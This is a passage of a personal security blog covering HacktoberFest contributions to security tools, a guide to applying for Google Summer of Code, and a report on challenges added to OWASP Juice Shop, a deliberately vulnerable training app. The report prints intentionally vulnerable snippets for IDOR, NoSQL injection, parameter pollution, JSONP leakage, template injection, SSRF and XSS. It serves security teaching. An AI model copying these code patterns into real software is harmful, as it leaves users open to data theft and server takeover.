<h2 id="HacktoberFest-2018"><a href="#HacktoberFest-2018" class="headerlink" title="HacktoberFest 2018"></a>HacktoberFest 2018</h2><p>Let‚Äôs start this with gentle introduction to purpose behind all of it. HacktoberFest (Hack + <code>October</code> + Fest) is an yearly celebration by Github for luring people into contributing to FOSS.<br>Github and sponsors of HacktoberFest offer a pretty T-shirt as swag to people who complete HacktoberFest challenge of submitting 5 non-spam Pull Requests to any of the FOSS project on Github. Well you can easily submit BullShit PRs and get that Github Swag as can be seen very clearly („ÄúÔø£‚ñ≥Ôø£)„Äú</p>
<p><br><br><img src="/2018/10/20/CaptainFreak-Experience-1-HacktoberFest-2018/htf.png" title="Top HacktoberFest Repositories"></p>
<center> <em>Top HacktoberFest Repositories</em>  </center>

<p>HacktoberFest‚Äôs swag is too pretty to be earned like this and also one shouldn‚Äôt miss on such good opportunity to learn and feel proud by contributing to the communities favorite projects. ¬Ø\<em>(„ÉÑ)</em>/¬Ø</p>
<p>Ok with all the ranting out of the way :P, lets get over with it.</p>
<h2 id="GitDump"><a href="#GitDump" class="headerlink" title="GitDump"></a>GitDump</h2><p>I started of small with contributing to a simple project which aims to be a plug before merging a PR commited with secret credentials(API keys, token, passwords etc) of third party service. If this commit histories with valid credentials are mined by an adversary, it can cause massive breaches/compromises and hence a hell lot of trouble for organizations. Small but useful script, enhanced it with some more keywords to look for.<br>PR : <a href="https://github.com/prateek-0490/GitDump/pull/2" target="_blank" rel="noopener">Link</a></p>
<h2 id="Reconnoitre"><a href="#Reconnoitre" class="headerlink" title="Reconnoitre"></a>Reconnoitre</h2><p>As its description says, ‚ÄúA security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing‚Äù. In a nutshell its a tool written in python to automate information discovery, more relevant on OSCP lab machines. Initially I wanted to contribute to its core functionality but ended up contributing a standard setup module.<br>PR : <a href="https://github.com/codingo/Reconnoitre/pull/67" target="_blank" rel="noopener">Link</a></p>
<h2 id="NoSQLMap"><a href="#NoSQLMap" class="headerlink" title="NoSQLMap"></a>NoSQLMap</h2><p>Again its a python tool to automate detection and exploitation of NoSQL Injection Web Attack. Previously I had used it for checking my own written vulnerable code and even though its pretty robust tool, It wasn‚Äôt able to detect the context of injection which my code had. I had decided to someday contribute and enhance it to detect the injection in this context. What‚Äôs better time than HacktoberFest for this :). Looked into it again and found that it was getting stuck in some trivial loop before firing payloads. Fixed this bug and further will be trying to enhance it with some payloads.<br>PR : <a href="https://github.com/codingo/NoSQLMap/pull/71" target="_blank" rel="noopener">Link</a></p>
<h2 id="Subfinder-‚ô•"><a href="#Subfinder-‚ô•" class="headerlink" title="Subfinder ‚ô•"></a>Subfinder ‚ô•</h2><p>This is one of those tools which I or any of the hunters out there can‚Äôt live without. Respect 100. It‚Äôs a subdomain enumeration tool with tons of relevant and reliable passive sources of domain discovery and also bundles in bruteforce engine, resolvers etc. I was supposed to be contributing to it from its initial days but due to my incompatibility with Golang and other commitments, I couldn‚Äôt. But took a strike at it again with hacktoberfest. Took a hurried look over Golang for an hour and I was ready to contribute as it is very well structured tool with lots of modularity and it made me focus on logic flow instead of worrying about syntactic unfamiliarities. I added another passive source called <a href="https://urlscan.io/" target="_blank" rel="noopener"><code>Urlscan.io</code></a> to it.<br>PR : <a href="https://github.com/subfinder/subfinder/pull/148" target="_blank" rel="noopener">Link</a> </p>
<h2 id="Metasploit-‚ù§‚ù§"><a href="#Metasploit-‚ù§‚ù§" class="headerlink" title="Metasploit ‚ù§‚ù§"></a>Metasploit ‚ù§‚ù§</h2><p>Oh this tool should not require any introduction because that would be disrespect to it. But still for you suckers who don‚Äôt know, It‚Äôs a de facto penetration testing framework written in Ruby with 539+ payloads ready to shoot with 1800+ publicly disclosed exploits with 40+ encoders. Frameworks are meant to make the things easy, and I can‚Äôt think of another framework which beats Metasploit in that regards. Over that its very very well written, designed and structured piece of software with an extensive contribution guide. One of the best open source project and community. I can just go on and on praising it &lt;3</p>
<p><br></p>
<p><img src="https://media.giphy.com/media/3q3QK6KyDVUBzih7hB/giphy.gif" alt=""></p>
<p><br></p>
<p>I had used metasploit in the past but not very extensively and had not enumerated it‚Äôs all features. Still being naive, directly jumped into its massive codebase :P. I had not even written a simple Ruby program of <code>puts &quot;Hello Ruby&quot;</code> before. As expected failed miserably to understand it‚Äôs internals. Started off again from enumerating metasploit and learning Ruby. After that it was relatively clear. Found a simple issue of adding enhancement of TCP protocol to its <code>SNMP Login Scanner</code> along with its implementation of UDP. Learned a lot about project‚Äôs core, Ruby, SNMP, its use and its significance in information gathering for pentesting networks. Metasploit community is very strict regarding merging PRs, I guess it will take a lot of polishing before my PR gets ready to merge as it‚Äôs my first one.<br>PR : <a href="https://github.com/rapid7/metasploit-framework/pull/10841" target="_blank" rel="noopener">Link</a></p>
<hr>
<p><br><br><img src="/2018/10/20/CaptainFreak-Experience-1-HacktoberFest-2018/htfrepos.png" title="HacktoberFest Contribution List"><br><br><br>Ok, that‚Äôs it folks. It was very less time for such challenge to be completed but I tried, Maybe I could have tried harder. Anyway, October is still young. I would suggest to contribute to FOSS, earn knowledge and a bonus T-shirt with it. If you are not able to understand any of the mentioned things go to this <a href="http://bfy.tw/KSuS" target="_blank" rel="noopener">Magical Link</a>. I am still a script kiddie üòá hence if you feel something is erroneous/inaccurate, feel free to comment below.</p>
<p>Shoutout to <a href="https://twitter.com/hdmoore" target="_blank" rel="noopener">@hdmoore</a>, <a href="https://twitter.com/_sinn3r" target="_blank" rel="noopener">@sinn3r</a>, <a href="https://twitter.com/Ice3man543" target="_blank" rel="noopener">@Ice3man</a>, <a href="https://twitter.com/codingo_" target="_blank" rel="noopener">@codingo_</a>, <a href="https://twitter.com/prateek_0490" target="_blank" rel="noopener">@prateek</a>, <a href="https://www.linkedin.com/in/rahuldhawan291" target="_blank" rel="noopener">@rahuldhawan291</a>, <a href="https://twitter.com/manasmahapatra301212" target="_blank" rel="noopener">@manasmahapatra</a> for all these awesome projects and help.</p>
<p>Cheers to Hackery and Growth,<br>CaptainFreak</p>
]]></content>
      
        
        <tags>
            
            <tag> Infosec </tag>
            
            <tag> OpenSource </tag>
            
            <tag> FOSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Google Summer of Code 101]]></title>
      <url>/2018/08/18/Google-Summer-of-Code-2018/</url>
      <content type="html"><![CDATA[<h1 id="Google-Summer-of-Code-101"><a href="#Google-Summer-of-Code-101" class="headerlink" title="Google Summer of Code 101"></a>Google Summer of Code 101</h1><p>Google Summer of Code or famously known as <code>&quot;GSoC&quot;</code> is an initiative by Google to enhance the Open Source culture and projects. Open source softwares are at the core of every thing related to computer science. If you are a computer science student and are not using any open source tool/application/software/framework/platform/library and language then there‚Äôs something really wrong with you. Even though the importance of open source projects being <strong>gigantic</strong>, most of this projects are made out of hobby or fun by their respective project leads, and as there is no direct incentive of monetization of this projects they lack the pace of development like proprietry or enterprise softwares. To eradicate this, every year Google organizes the GSoC underwhich the potential(which have better impact and use-case) open source projects and students work for enhancing the projects.</p>
<p>As you can see, its a great initiative where you being a student contribute to some great project which actually enhances people‚Äôs lives, productivity, pace of invention and <strong><code>makes this world a better place</code></strong>. LOL !</p>
<p><img src="https://media.giphy.com/media/3oEdv7vedu6iAZoqTS/giphy.gif" alt=""></p>
<pre><code>- Classic Gavin Belson (Silicon Valley, HBO)
</code></pre><p><em>Note : Do yourself a favour and watch Silicon Valley and Mr.Robot if you havent already.</em></p>
<p>Every year thousands of student apply for GSoC from around the world and only nearly a thousad student(1,264 in 2018) get accepted. Lots of Competition. There was‚Äônt any proper guide when last time I checked which elaborates on how to properly apply and maximize the chance of acceptance. As I have completed GSoC 2018 succesfully, I have some insights to share.<br>If you are planning to apply for GSoC or don‚Äôt have anything productive to do right now, Read along :)</p>
<h2 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h2><p>1.<strong>Proper knowledge of any VCS(Version Control System)</strong></p>
<p>Mostly projects use <code>git</code> as their primary VCS and Github or Bitbucket as their VCS hosting service, so I would recommend learning Git and collaboration on Github.</p>
<p>2.<strong>Any one of the following language</strong></p>
<p>C,C++,Python,Java and Javascript.<br>Projects which use other languages are also present but for a fresher this are the easy and manadatory ones to know. Also if you know more languages you will have more options to choose from.</p>
<p>3.<strong>Couple of relevant personal open sourced projects (not mandatory, but why not ?)</strong><br>4.<strong>Hunger for knowledge ¬Ø\<em>(„ÉÑ)</em>/¬Ø</strong></p>
<h2 id="Prereparation"><a href="#Prereparation" class="headerlink" title="Prereparation"></a>Prereparation</h2><p>Before even thinking about applying to GSoC you should be using atleast some open source software and must have interest in some sub-field (Machine/Deep learning, Artificial Intelligence, Algo-DS, Operating Systems, Database Systems, Networking, Security, Development etc.) of computer science. The below preparation must start before 2-3 months of official GSoC start date.</p>
<ol>
<li>Head over to previous year‚Äôs GSoC <a href="https://summerofcode.withgoogle.com/archive/" target="_blank" rel="noopener">Archives</a> (These projects are most likely to come again) and search for the project/organization you would like to contribute to according to your interest.</li>
<li>Use the software as normal user is supposed to and enumerate each and every way of using it.</li>
<li>Align your learnings of tech stack and knowledge as required for that project or preferabely choose the one that aligns with yours.</li>
<li>Head over to that project‚Äôs source code repository, setup the Dev-environment, read the docs and other relevant material extensively.</li>
<li>Get totally familiar with source code(will be initimidating at first but can get really easy if you do second step thoroughly).</li>
<li>Contact the project lead/Community on given communication channel, ask them doubts, bugs to fix, feature enhancements etc.</li>
<li>Ask them to assign any task to you.</li>
<li>Start Contributing.</li>
</ol>
<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><p>After selected organizations get announced(mostly in month of February) and if your selected projects and organizations are there then no worries as at this point of time you would have contributed much to the project. If they aren‚Äôt then start the preparation for the selected ones again.<br>Applying to GSoC consists of writing a detailed proposal of your project which highlights the purpose of project, each and every enhancement you will add during coding phase of GSoC and reasons that make you fit for the project. This needs not to be in some formal format but also should not be very informal. Proposal writing can be daunting and hard if you have not done the proper preparation as mentioned above and will not reflect the experience. This will lead to project rejection very easily. In my case the application phase of GSoC was just a formality because I had contributed and had bonded with the community of my project in a very good way. Also there aren‚Äôt many successful proposal templates shared openly. If you are not able to decide the structure of your proposal, you can have a look at mine <a href="https://docs.google.com/document/d/14kw1CJdKlCqISlfgNgK4OHkQzaC51TtXa5k7Hvb7Exs/edit?usp=sharing" target="_blank" rel="noopener"><strong>here</strong></a>.</p>
<h2 id="Learnings"><a href="#Learnings" class="headerlink" title="Learnings"></a>Learnings</h2><p>Learnings during GSoC can vary person to person depending on their prior experience. But for me the learning and experience gain curve was very steep. The software development concepts like Test writing, Collaborated developement, working with large code-bases, Maintainable coding etc. are not just concepts for me anymore as I had thorough hands-on. Also the computer science/technology concepts on which your project is based on will become your expertise. ;)</p>
<p><img src="https://imgs.xkcd.com/comics/git.png" alt=""></p>
<h2 id="Perks"><a href="#Perks" class="headerlink" title="Perks"></a>Perks</h2><p>Mention of successful completion of Google Summer of Code on your resume depicts that you know how to work on codebases of softwares which have actual user bases unlike the personal projects. GSoC is much more prestigious than internship in any low tier startup/company. So I would recommend to students of freshmen and sophomore year to apply for GSoC. Its a win-win situation for everybody involved. Students get valuable experience and hepty <a href="https://developers.google.com/open-source/gsoc/help/student-stipends" target="_blank" rel="noopener">stipend</a>. Open Source projects get enhanced. Google‚Äôs incentive of <code>making this world a better place</code> LOL X) gets completed.</p>
<p>If you haven‚Äôt already read my GSoC project report, read it <a href="https://blog.shoebpatel.me/2018/08/05/OWASP-Juice-Shop-Challenge-Pack-2018-GSoC-project-report/" target="_blank" rel="noopener">here</a>.</p>
<p>Hope you picked up some tips ¬Ø\<em>(„ÉÑ)</em>/¬Ø<br>Keep Contributing, Keep Hacking !<br>CaptainFreak</p>
]]></content>
      
        
        <tags>
            
            <tag> GSoC 2018 </tag>
            
            <tag> OWASP </tag>
            
            <tag> GSoC </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OWASP Juice Shop : Challenge Pack 2018 (GSoC project report)]]></title>
      <url>/2018/08/05/OWASP-Juice-Shop-Challenge-Pack-2018-GSoC-project-report/</url>
      <content type="html"><![CDATA[<h1 id="OWASP-Juice-Shop-Challenge-Pack-2018"><a href="#OWASP-Juice-Shop-Challenge-Pack-2018" class="headerlink" title="OWASP Juice Shop Challenge Pack 2018"></a>OWASP Juice Shop Challenge Pack 2018</h1><p>This post is supposed to be a report of work done under the project <a href="https://summerofcode.withgoogle.com/projects/#6618613964865536" target="_blank" rel="noopener">‚ÄúChallengePack 2018‚Äù</a> of <a href="https://github.com/bkimminich/juice-shop" target="_blank" rel="noopener">Juice Shop</a> which I did as Student Developer at OWASP as part of <a href="https://summerofcode.withgoogle.com" target="_blank" rel="noopener">Google Summer of Code 2018</a>. For those who are unaware of what Juice Shop is, please do check it out. Its an intentionally kept vulnerable web application which aims to be a learning/practising resource for Web Developer as well as Web Security Enthusiasts. Instead of just making a dry report I will try to document the things that I learned while completing each task that was proposed. I hope it will benefit the future contributers/GSoC students of Juice Shop/WebDevelopers/Hackers as a documentation and will hold the information about what has been happening to Juice Shop over the course of Summer 2018. I will also show exactly which lines of code were made vulnerable to introduce each challenge. Before hand I would like to say that I am still a noob ü§∑‚Äç and have no expertise in WebSecurity and Web Development, So if you feel that something is incorrect then I am totally open to positive criticism. Please comment your thoughts below :). So without further ado, Lets get this started.</p>
<p><img src="https://media.giphy.com/media/26h0poAzDM5h8gHWE/giphy.gif" alt=""></p>
<p>Under Google Summer of Code 2018, Juice Shop had two projects, One was my <code>Challenge Pack 2018</code> whose work is under <a href="https://github.com/bkimminich/juice-shop/tree/gsoc-challenges" target="_blank" rel="noopener">gsoc-challenges</a> branch and other project was <code>Frontend Upgrade</code> by <a href="https://github.com/Aashish683" target="_blank" rel="noopener">@Aashish</a> whose work is under <a href="https://github.com/bkimminich/juice-shop/tree/gsoc-frontend" target="_blank" rel="noopener">gsoc-frontend</a> branch. </p>
<h2 id="Tests-For-‚ÄúOld-School-XSS‚Äù-Challenge"><a href="#Tests-For-‚ÄúOld-School-XSS‚Äù-Challenge" class="headerlink" title="Tests For ‚ÄúOld-School XSS‚Äù Challenge"></a>Tests For ‚ÄúOld-School XSS‚Äù Challenge</h2><p>Previously (Before start of official coding phase of GSoC), I had designed and added the functionality of tracking user orders and challenge of ‚ÄúReflected XSS‚Äù around it but Unit, Integration and E2E tests for the functinality and challenge were remaining because I was not very good at the test writing technologies of Juice Shop. This PR took quite a lot of time to get complete and merge but along the way I learned about those technologies and purpose of writing tests.</p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/567" target="_blank" rel="noopener">XSS Challenge Tests</a></p>
<h2 id="‚ÄúLateral-Privilege-Escalation-Insecure-Direct-Object-Reference‚Äù-Challenge"><a href="#‚ÄúLateral-Privilege-Escalation-Insecure-Direct-Object-Reference‚Äù-Challenge" class="headerlink" title="‚ÄúLateral Privilege Escalation/Insecure Direct Object Reference‚Äù Challenge"></a>‚ÄúLateral Privilege Escalation/Insecure Direct Object Reference‚Äù Challenge</h2><p>Although Juice Shop is meant to be fully vulnerable, this bug was unintentinal one and was reported by another user in an <a href="https://github.com/bkimminich/juice-shop/issues/538" target="_blank" rel="noopener">issue</a>. Any user was able to post product reviews as any user. The challenge got designed as to post a forged review as another user. It was kind of reassuring to see that even security aware developers can write vulnerable code and vulnerabilities will be always out there.</p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/572" target="_blank" rel="noopener">Forged Review</a><br>Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function productReviews () &#123;</span><br><span class="line">  return (req, res, next) =&gt; &#123;</span><br><span class="line">  // No check of object ownership :)</span><br><span class="line">    db.reviews.insert(&#123;</span><br><span class="line">      product: req.params.id,</span><br><span class="line">      message: req.body.message,</span><br><span class="line">      author: req.body.author,</span><br><span class="line">      likesCount: 0,</span><br><span class="line">      likedBy: []</span><br><span class="line">    &#125;).then(result =&gt; &#123;</span><br><span class="line">      res.status(201).json(&#123; staus: &apos;success&apos; &#125;)</span><br><span class="line">    &#125;, err =&gt; &#123;</span><br><span class="line">      res.status(500).json(err)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="‚ÄúVulnerable-Node-Module‚Äù-Challenge"><a href="#‚ÄúVulnerable-Node-Module‚Äù-Challenge" class="headerlink" title="‚ÄúVulnerable Node Module‚Äù Challenge"></a>‚ÄúVulnerable Node Module‚Äù Challenge</h2><p>Node ecosystem heavily relies on node modules and a lot can go wrong if the modules you are using are vulnerable and outdated. This challenge got designed around the recent vulnerability disclosure called <a href="https://github.com/snyk/zip-slip-vulnerability" target="_blank" rel="noopener">Zip-Slip</a>. Archive extraction packages which are used for unzipping archives were allowing arbitrary file write at server-side. I added functionality of Multiple complaint submission through archive upload and designed the challenge of overwriting an important file of the Juice Shop. The hurdle we came upon was to properly sandbox this so that people using Juice Shop over local instance don‚Äôt overwrite the important files of their own system by mistake as crafting payload archive for this can result in mistakes because of black-box scenario. I solved it by checking absolute paths of files before extraction.</p>
<p><img src="https://user-images.githubusercontent.com/20478531/41213943-094f86a4-6d66-11e8-807d-468b55fe5a40.png" alt=""></p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/611" target="_blank" rel="noopener">Vulnerable node module</a><br>Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;unzipper&quot;: &quot;0.8.12&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="‚ÄúTier-3-NoSQL-Injection‚Äù-Challenge"><a href="#‚ÄúTier-3-NoSQL-Injection‚Äù-Challenge" class="headerlink" title="‚ÄúTier 3 NoSQL Injection‚Äù Challenge"></a>‚ÄúTier 3 NoSQL Injection‚Äù Challenge</h2><p>Juice Shop uses MarsDB as its NoSQL Database. After implementing the challenge of getting orders of all the users, I got quite a context about how and where this bug can happen in NoSQL Databases in general.</p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/577" target="_blank" rel="noopener">NoSQLi Tier 3</a><br>Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.orders.find(&#123; $where: &quot;this.orderId === &apos;&quot; + req.params.id + &quot;&apos;&quot; &#125;).then()</span><br></pre></td></tr></table></figure></p>
<h2 id="‚ÄúHTTP-Parameter-Pollution‚Äù-Challenge"><a href="#‚ÄúHTTP-Parameter-Pollution‚Äù-Challenge" class="headerlink" title="‚ÄúHTTP Parameter Pollution‚Äù Challenge"></a>‚ÄúHTTP Parameter Pollution‚Äù Challenge</h2><p>HPP vulnerability primarily depends upon the reqest body parsers. In the case of Juice Shop, JSON parser was the default one which just takes the value of last paramater present. To implement this challenge I used different parser specifically for this challenge. Scenario of the challenge was very typical where the first occurance of paramater was used for validating but the value was taken for use from last occurance of the paramater in POST JSON body. Challenge was to succesfully edit other user‚Äôs basket.</p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/623" target="_blank" rel="noopener">HTTP Parameter Pollution</a><br>Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if (user &amp;&amp; basketIds[0] &amp;&amp; basketIds[0] !== &apos;undefined&apos; &amp;&amp; user.bid != basketIds[0]) &#123; // eslint-disable-line eqeqeq</span><br><span class="line">  res.status(401).send(&apos;&#123;\&apos;error\&apos; : \&apos;Invalid BasketId\&apos;&#125;&apos;)</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  const basketItem = &#123;</span><br><span class="line">    ProductId: productIds[productIds.length - 1],</span><br><span class="line">    BasketId: basketIds[basketIds.length - 1],      // Using value from second occurance bypasses the validation</span><br><span class="line">    quantity: quantities[quantities.length - 1]</span><br><span class="line">  &#125;</span><br><span class="line">  const basketItemInstance = models.BasketItem.build(basketItem)</span><br><span class="line">      basketItemInstance.save().then((basketItem) =&gt; &#123;</span><br><span class="line">        basketItem = &#123;</span><br><span class="line">          status: &apos;success&apos;,</span><br><span class="line">          data: basketItem</span><br><span class="line">        &#125;</span><br><span class="line">        res.json(basketItem)</span><br><span class="line">      &#125;).catch(err =&gt; &#123;</span><br><span class="line">        next(err)</span><br><span class="line">      &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="‚ÄúJSONP-XSSi‚Äù-Challenge"><a href="#‚ÄúJSONP-XSSi‚Äù-Challenge" class="headerlink" title="‚ÄúJSONP/XSSi‚Äù Challenge"></a>‚ÄúJSONP/XSSi‚Äù Challenge</h2><p>Even though Juice Shop doesn‚Äôt have an actual use case for JSONP because it is just one application running on single domain but for making it a complete learning resource, I added JSONP on an endpoint which returns user‚Äôs personal information wrapped up in a function whose name is decided by a <code>GET</code> parameter called <code>callback</code>. The challenge was to guess/bruteforce for this JSONP endpoint.</p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/627" target="_blank" rel="noopener">JSONP</a><br>Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function retrieveLoggedInUser () &#123;</span><br><span class="line">  return (req, res) =&gt; &#123;</span><br><span class="line">    const user = insecurity.authenticatedUsers.from(req)</span><br><span class="line">    const response = &#123; user: &#123; id: (user &amp;&amp; user.data ? user.data.id : undefined), email: (user &amp;&amp; user.data ? user.data.email : undefined) &#125; &#125;</span><br><span class="line">    if (req.query.callback === undefined) &#123;</span><br><span class="line">      res.json(response)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      res.jsonp(response)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="‚ÄúRace-Condition-Timing-Attack‚Äù-Challenge"><a href="#‚ÄúRace-Condition-Timing-Attack‚Äù-Challenge" class="headerlink" title="‚ÄúRace Condition/Timing Attack‚Äù Challenge"></a>‚ÄúRace Condition/Timing Attack‚Äù Challenge</h2><p>This was my favorite challenge to implement because of its complexity and unavailability in any other vulnerable application (as far as I know). Juice Shop can not have race condition bug naturally because it uses MarsDB and it has no reason of having that much observable latency. So we had to add that artificially. Vulnerability and Challenge structure was like following :</p>
<p><img src="https://user-images.githubusercontent.com/20478531/41278766-4cf64522-6e48-11e8-9377-64c4ee653b49.png" alt=""></p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/617" target="_blank" rel="noopener">Race Condition/Timing Attack</a><br>Link to Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bkimminich/juice-shop/pull/617/files#diff-fb4c8fba3911529be7878d2553b1fed1</span><br></pre></td></tr></table></figure></p>
<h2 id="‚ÄúMass-Assignement‚Äù-Challenge"><a href="#‚ÄúMass-Assignement‚Äù-Challenge" class="headerlink" title="‚ÄúMass Assignement‚Äù Challenge"></a>‚ÄúMass Assignement‚Äù Challenge</h2><p>Mass assignment Vulnerability is very prevalent in web technologies where request‚Äôs body is mapped to objects directly using some library etc. In Juice Shop the users can become admin while signing up by adding an ingeniosly guessed extra parameter called <code>isAdmin</code> by looking at reponses. which gets mapped to database column without any check and users get admin privileges.</p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/629" target="_blank" rel="noopener">Mass Assignement</a><br>Link to Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bkimminich/juice-shop/pull/629/files#diff-45182e43f88790a0b1fdc8479ebb66b1</span><br></pre></td></tr></table></figure></p>
<h2 id="‚ÄúExploit-Chain-1‚Äù-Challenge"><a href="#‚ÄúExploit-Chain-1‚Äù-Challenge" class="headerlink" title="‚ÄúExploit Chain 1‚Äù Challenge"></a>‚ÄúExploit Chain 1‚Äù Challenge</h2><p>From the start I wanted to add a cool vulnerability chain in the Juice Shop. The exploit chain was supposed to be a chain of Login CSRF paired with Self XSS where XSS payload was sent through <code>True-Client-IP</code> header. But due to Juice Shop‚Äôs solution checking mechanism and standalone nature, We decided to convert the chain to simple XSS.</p>
<p><img src="https://user-images.githubusercontent.com/20478531/42200313-45a46b28-7eb0-11e8-9239-5feffad0074f.jpg" alt=""></p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/632" target="_blank" rel="noopener">Exploit Chain 1</a><br>Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rootScope.lastLoginIp = $sce.trustAsHtml(user.lastLoginIp)</span><br></pre></td></tr></table></figure></p>
<p><em>As you can see, Even adding XSS intentionally in angular apps is tough. So my advice to all hunters, As soon as you see target is using angular, stop spraying XSS payloads.</em></p>
<h2 id="‚ÄúServer-Side-Template-Injection‚Äù-Challenge"><a href="#‚ÄúServer-Side-Template-Injection‚Äù-Challenge" class="headerlink" title="‚ÄúServer Side Template Injection‚Äù Challenge"></a>‚ÄúServer Side Template Injection‚Äù Challenge</h2><p>This was one of my another favorite challenge to add. Initially Juice Shop used Client side rendering and was totally secure to SSTi. For adding this challenge I added the user profile page which was rendered using the jade template engine. Username field was made vulnerable to SSTi. SSTi is basically RCE for modern application which use Server Side template engine. To make this new RCE bug more cool, <a href="https://twitter.com/j12934" target="_blank" rel="noopener">@Jannik</a> suggested a very cool challenge around it which involved exploiting this RCE to infect the Juice Shop server with malware. Yep üòé ! </p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/655" target="_blank" rel="noopener">Server Side Template Injection</a> Yet to be merged.<br>Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">templateString = templateString.replace(&apos;usrname&apos;, user.dataValues.username)</span><br><span class="line">var fn = jade.compile(templateString)</span><br><span class="line">res.send(fn(user.dataValues))</span><br></pre></td></tr></table></figure></p>
<h2 id="‚ÄúServer-Side-Request-Forgery‚Äù-Challenge"><a href="#‚ÄúServer-Side-Request-Forgery‚Äù-Challenge" class="headerlink" title="‚ÄúServer Side Request Forgery‚Äù Challenge"></a>‚ÄúServer Side Request Forgery‚Äù Challenge</h2><p>SSRF is a critical vulnerability if attacker is able to pivot into internal network of the target. As Juice Shop being a standalone application, doesn‚Äôt have it. So a very basic version of SSRF was implemented around the functinality of image upload using URL. The challenge gets solved when you request a hidden resource of Juice Shop server. The hidden resource is supposed to be obtained from the malware of SSTI challenge üòÅ.</p>
<p>Link to PR : <a href="https://github.com/bkimminich/juice-shop/pull/655" target="_blank" rel="noopener">Server Side Request Forgery</a> Yet to be merged.<br>Vulnerable Code-Snippet :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function profileImageUrlUpload () &#123;</span><br><span class="line">  return (req, res, next) =&gt; &#123;</span><br><span class="line">	  	var url = req.body.imageUrl</span><br><span class="line">		request</span><br><span class="line">		.get(url)   // Requesting without any check</span><br><span class="line">		.on(&apos;error&apos;, function (err) &#123;</span><br><span class="line">		console.log(err)</span><br><span class="line">		&#125;)</span><br><span class="line">		.pipe(fs.createWriteStream(&apos;frontend/dist/frontend/assets/public/images/uploads/&apos; + loggedInUser.data.id + &apos;.jpg&apos;))</span><br><span class="line">	&#125;</span><br><span class="line">    res.location(&apos;/profile&apos;)</span><br><span class="line">    res.redirect(&apos;/profile&apos;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="Abandoned-Postponed-Challenges"><a href="#Abandoned-Postponed-Challenges" class="headerlink" title="Abandoned/Postponed Challenges"></a>Abandoned/Postponed Challenges</h2><ol>
